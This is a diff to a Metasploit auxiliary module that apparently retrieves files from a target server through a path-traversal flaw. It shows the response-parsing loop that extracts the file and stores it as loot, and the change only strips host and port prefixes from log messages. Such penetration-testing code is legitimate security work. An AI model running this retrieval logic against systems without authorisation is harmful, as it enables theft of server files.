@@ -62,21 +62,21 @@ class MetasploitModule < Msf::Auxiliary
         )
 
         if res.nil?
-          print_error("#{rhost}:#{rport} Connection timed out")
+          print_error("Connection timed out")
           return
         end
 
-        print_status("#{rhost}:#{rport} Trying URL " + payload)
+        print_status("Trying URL " + payload)
 
         if (res and res.code == 200 and res.body)
           if res.body.match(/\<html\>(.*)\<\/html\>/im)
             html = $1
 
             if res.body =~ /unknowntopic/
-              print_error("#{rhost}:#{rport} Could not retrieve the file")
+              print_error("Could not retrieve the file")
             else
               file_data = html.gsub(%r{(.*)<pre>|<\/pre>(.*)}m, '')
-              print_good("#{rhost}:#{rport} Successfully retrieved #{file} and storing as loot...")
+              print_good("Successfully retrieved #{file} and storing as loot...")
 
               # Transform HTML entities back to the original characters
               file_data = file_data.gsub(/\&gt\;/i, '>').gsub(/\&lt\;/i, '<').gsub(/\&quot\;/i, '"')
@@ -85,17 +85,17 @@ class MetasploitModule < Msf::Auxiliary
               return
             end
           else
-            print_error("#{rhost}:#{rport} No HTML was returned")
+            print_error("No HTML was returned")
           end
         else
           # if res is nil, we hit this
-          print_error("#{rhost}:#{rport} Unrecognized #{res.code} response")
+          print_error("Unrecognized #{res.code} response")
         end
         i += 1;
       end
     end
 
-    print_error("#{rhost}:#{rport} Not vulnerable or the DEPTH setting was too low")
+    print_error("Not vulnerable or the DEPTH setting was too low")
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
   rescue ::Timeout::Error, ::Errno::EPIPE
   end
